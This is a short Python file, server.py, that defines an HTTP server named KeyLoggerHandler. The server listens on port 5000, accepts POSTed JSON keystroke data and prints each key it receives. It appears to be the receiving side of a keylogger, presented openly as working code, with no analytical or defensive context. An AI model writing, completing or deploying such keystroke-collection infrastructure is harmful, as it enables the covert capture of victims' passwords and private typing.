# server.py

import http.server
import socketserver
import json

class KeyLoggerHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        key_data = json.loads(post_data.decode('utf-8'))

        # Log the received key data (you can customize this part)
        print(f"Received key: {key_data['key']}")

        # Respond to the client
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        #self.wfile.write(b"Key data received successfully!")

if __name__ == "__main__":
    PORT = 5000
    with socketserver.TCPServer(("", PORT), KeyLoggerHandler) as httpd:
        print(f"Server listening on port {PORT}")
        httpd.serve_forever()
